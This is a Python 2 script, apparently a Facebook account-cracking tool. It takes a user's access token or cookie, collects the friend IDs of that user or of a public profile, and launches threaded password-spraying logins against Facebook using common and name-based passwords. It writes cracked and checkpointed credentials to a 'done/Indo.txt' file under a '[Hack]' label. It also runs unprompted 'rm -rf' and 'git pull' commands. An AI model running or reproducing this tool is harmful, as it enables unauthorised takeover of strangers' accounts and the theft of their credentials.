
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
os.system("rm -rf .pain.py ;rm -rf .0.py ;rm -rf .10.py")
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install tor')
    os.system('pkg install tor')
    os.system('pip2 install mechanize')

try:
    print(".")
except:
    pass

reload(sys)
sys.setdefaultencoding('utf8')
merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

def keluar():
    print '\x1b[1;97m[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdtoket.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = "\n    )           \n ( /(     (     \n )\()) (  )\ )  \n((_)\ ))\(()/(  \n _((_)((_)((_)) \n|_  (_))  _| |  \n / // -_) _` |  \n/___\___\__,_|  \n                \n"
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '  Login  ' + o,
        sys.stdtoket.flush()
        time.sleep(1)


idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
listgrup = []
cekrek = []
vulnot = '   Not Found'
vuln = '    Found'

def masuk():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 50 * '-'
        print ' {1}- Login With Token '
        print ' {2}- Login With Cookies'
        print ' {0}- Exit '
        print 50 * '-'
        pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\n Choose  : ')
    if msuk == '':
        print ' !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        cookie()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print ' !'
        pilih_masuk()


def cookie():
    os.system('clear')
    print logo
    print 50 * '-'
    cookie = raw_input('  Cookies>  ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : Maybe your cookie invalid !!' if find_token is None else '\n*   Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '[!] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    jalan(' Login Success ')
    menu()
    return


def tokenz():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 50 * '-'
        toket = raw_input('  Token>  ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(toket)
            zedd.close()
            jalan('  Login Success ')
            menu()
        except KeyError:
            print ' !  !'
            time.sleep(1.7)
            tokenz()


def menu():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '  !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
    except KeyError:
        os.system('clear')
        print ' !  '
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '  Erorr'
        keluar()

    os.system('git pull')
    os.system('clear')
    print logo
    print ' {1}- Start CRACK '
    print ' {3}- Follow Me'
    print ' {0}- Logout'
    print 50 * '-'
    pilih_menu()


def pilih_menu():
    peak = raw_input(' Select>> ')
    if peak == '':
        print ' !'
        pilih_menu()
    elif peak == '1' or peak == '01':
        passchoice()
    elif peak == '46765862' or peak == '07898732':
        uid()
    elif peak == '3' or peak == '03':
        grup()
    elif peak == '7987586473624' or peak == '536987676453404':
        updatetools()
    elif peak == '0' or peak == '00':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print ' !'
        pilih_menu()


def passchoice():
    os.system('clear')
    print logo
    print 50 * '-'
    print ' {1}- CRACK From FriendList'
    print ' {2}- CRACK From Public ID'
    print ' {0}- BACK To Menu'
    print 50 * '-'
    pilih_passxd()


def pilih_passxd():
    global cekpoint
    global oks
    peak = raw_input(' Select>> ')
    if peak == '':
        print ' ! '
        pilih_passxd()
    elif peak == '1' or peak == '01':
        os.system('clear')
        print logo
        print 50 * '-'
        jalan('Total ID  : ')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif peak == '2' or peak == '02':
        os.system('clear')
        print logo
        print 50 * '-'
        idt = raw_input(' ID Public : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print ' Name : ' + sp['name']
        except KeyError:
            print '  !'
            raw_input('\n [BACK]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m\n Xat A Kaw Jwana !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif peak == '0' or peak == '00':
        menu()
    else:
        print ' !'
        passchoice()
    print 50 * '-'
    print ' Boom '
    print 50 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|') 
        try:
            pass1 = '1122334455'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '{\033[32m Great\033[0;1m } ' + uid + ' : '  + pass1
                oke = open('done/Indo.txt', 'a')
                oke.write('\n[Hack] ' + uid + ' : ' + pass1)
                oke.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in xo:
                cek = open('done/Indo.txt', 'a')
                cek.write('\n[Check] ' + uid + ' : ' + pass1)
                cek.close()
                cekpoint.append(uid + pass1)
            else:
                pass2 = '1234512345'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '{\033[32m Great\033[0;1m } ' + uid + ' : '  + pass2
                    oke = open('done/Indo.txt', 'a')
                    oke.write('\n[Hack] ' + uid + ' : ' + pass2)
                    oke.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in xo:
                    cek = open('done/Indo.txt', 'a')
                    cek.write('\n[Check] ' + uid + ' : ' + pass2)
                    cek.close()
                    cekpoint.append(uid + pass2)
                else:
                    pass3 = name.lower() + '123'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '{\033[32m Great\033[0;1m } ' + uid + ' : '  + pass3
                        oke = open('done/Indo.txt', 'a')
                        oke.write('\n[Hack] ' + uid + ' : ' + pass3)
                        oke.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in xo:
                        cek = open('done/Indo.txt', 'a')
                        cek.write('\n[Check] ' + uid + ' : ' + pass3)
                        cek.close()
                        cekpoint.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '1234'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '{\033[32m Great\033[0;1m } ' + uid + ' : '  + pass4
                            oke = open('done/Indo.txt', 'a')
                            oke.write('\n[Hack] ' + uid + ' : ' + pass4)
                            oke.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in xo:
                            cek = open('done/Indo.txt', 'a')
                            cek.write('\n[Check] ' + uid + ' : ' + pass4)
                            cek.close()
                            cekpoint.append(uid + pass4)
                        else:
                            pass5 = name.lower() + '12345'
                            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                            xo = rex.content
                            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                print '{\033[32m Great\033[0;1m } ' + uid + ' : '  + pass5
                                oke = open('done/Indo.txt', 'a')
                                oke.write('\n[Hack] ' + uid + ' : ' + pass5)
                                oke.close()
                                oks.append(uid + pass5)
        except:
        	pass
    p = ThreadPool(30)
    p.map(main, id)
    print 71 * '-'
    print '\x1b[1;92m\x1b[41m                   \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]                  \x1b[00m'
    print '\x1b[1;96m+-----------------------[+] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;96m+-----------------------[+] Cracking Accounts Saved To : Done/Indo.txt'
    print 71 * '\x1b[1;97m-'
    raw_input('\n+---------------------[\x1b[1;91mPress Enter Go Back To Menu\x1b[1;97m]-------------------+')
    os.sys.exit()

def uid():
    os.system('clear')
    print logo
    print 50 * '-'
    print '  {1}- Search ID Using Username  '
    print '  {2}- Search Username Using ID  '
    print '  {0}- Back '
    print 50 * '-'
    search()


def search():
    ud = raw_input(' ?  : ')
    if ud == '':
        print ' !'
        uid()
    elif ud == '1' or uid == '01':
        idf()
    elif ud == '2' or uid == '02':
        us()
    elif ud == '0':
        menu()
    else:
        print ' ! '
        uid()


def idf():
    try:
        u = raw_input('  FB Username : ')
        url = 'https://www.facebook.com/' + u
        r = requests.get(url).text
        name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
        id = re.search('profile/(.*?)" ', r).group(1)
        print '  Nama : ' + name
        print '  Id   : ' + id + '\n'
        raw_input('  [enter=Back]')
        uid()
    except requests.exceptions.ConnectionError:
        print '  !'
        keluar()
    except AttributeError:
        print ' User Not Found !'
        raw_input(' [Enter]')
        uid()


def us():
    try:
        u = raw_input('  FB ID : ')
        url = 'https://www.facebook.com/' + u
        r = requests.get(url).text
        name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
        user = re.search('https://www.facebook.com/(.*?)" />', r).group(1)
        print '  Nama     : ' + name
        print '  Username : ' + user + '\n'
        raw_input('  [BACK]')
        uid()
    except requests.exceptions.ConnectionError:
        print '  !'
        keluar()
    except AttributeError:
        print '  ! '
        raw_input(' [Enter]')
        uid()


def grup():
    os.system('clear')
    print logo
    print 50 * '-'
    print ' {1}- (Telegram)  '
    print ' {2}- (Youtube)  '
    print ' {0}- Back'
    print 50 * '-'
    pilih_grup()


def pilih_grup():
    gc = raw_input('\x1b[1;93m\n ? : ')
    if gc == '':
        print '\x1b[1;96m\n !'
        pilih_grup()
    elif gc == '1':
        os.system('clear')
        print logo
        print 71 * '-'
        os.system('xdg-open https://t.me/Lawan_CRACKER')
        grup()
    elif gc == '2':
        os.system('clear')
        print logo
        print 71 * '-'
        os.system('xdg-open https://www.youtube.com/channel/UCEhQ2zk99Or7vOZ3nBjj7Jg')
        grup()
    elif gc == '0':
        menu()
    else:
        print ' !'
        pilih_grup()


def updatetools():
    os.system('clear')
    os.system('pip2 install --upgrade ')
    os.system('clear')
    os.system('git pull')


if __name__ == '__main__':
    os.system('git pull')
    masuk()
